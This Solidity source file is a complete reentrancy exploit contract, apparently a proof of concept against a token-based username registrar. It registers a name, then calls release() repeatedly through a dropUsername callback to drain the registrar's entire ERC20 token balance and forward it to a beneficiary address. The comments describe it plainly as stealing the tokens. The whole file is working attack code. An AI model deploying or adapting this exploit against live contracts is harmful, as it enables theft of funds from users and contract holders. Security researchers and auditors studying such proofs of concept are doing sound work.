pragma solidity ^0.4.24;

// Set up an interface to UsernameRegistry to avoid import and keep this
// contract self-contained

interface UsernameRegistrar {
  function release (bytes32) external;
  function register (bytes32, address, bytes32, bytes32) external returns (bytes32);
  function price() external returns (uint);
}

// Similarly the ERC20 Token we are stealing
interface ERC20Token {
  function transfer(address _to, uint _value) external returns (bool);
  function approve(address _spender, uint _value) external returns (bool);
  function balanceOf(address) external view returns (uint);
}

contract ReentrancyAttack {

  UsernameRegistrar public usernameRegistrar;
  ERC20Token public token;
  // set an owner so someone else can't also use this attack
  address public owner;
  address public beneficiary; // the address to get all the stolen tokens
  bytes32 public registeredName; //for convenience
  uint public timesToReenter;

  constructor(
    UsernameRegistrar _unr,
    ERC20Token _token,
    address _beneficiary) public
  {
    usernameRegistrar = _unr;
    token = _token;
    beneficiary = _beneficiary;
    owner = msg.sender;
  }

  // this could be called in the constructor, but it's easier to run separately
  // once tokens have been sent here.
  function registerName(bytes32 name) public {
    require(msg.sender == owner); // prevent others from attacking
    registeredName = name;
    // approve tokens for  UsernameRegistrar
    token.approve(usernameRegistrar, usernameRegistrar.price());
    // register the name
    usernameRegistrar.register(name, 0x0, 0x0, 0x0);
  }

   // Once the registrar has been set to "this", we can steal all the tokens
   function stealAllTheTokens() public {
     require(msg.sender == owner); // prevent others from attacking
     require(registeredName != 0x0);
     // calculate the total balance and divide by price to determine
     // number of required re-entrancys'
     uint contract_balance = token.balanceOf(usernameRegistrar);
     uint price = usernameRegistrar.price();

     // revert if price=0 (controller can set it anyway)
     timesToReenter = contract_balance/price -1;
     // Re-enter a number of times.
     usernameRegistrar.release(registeredName);

     // all rentrancy done. Withdraw all the money
     // get our current balance of stolen funds
     uint balance = token.balanceOf(this);
     // transfer all our stolen money to beneficiary
     token.transfer(beneficiary, balance);
   }

  function dropUsername(bytes32 _nothing) public {
    if (timesToReenter > 0) {
       timesToReenter -= 1;
       usernameRegistrar.release(registeredName);
      }
    _nothing; //suppress warning
  }

  function () public {
    //do nothing. Required for moveRegistry()
  }
}
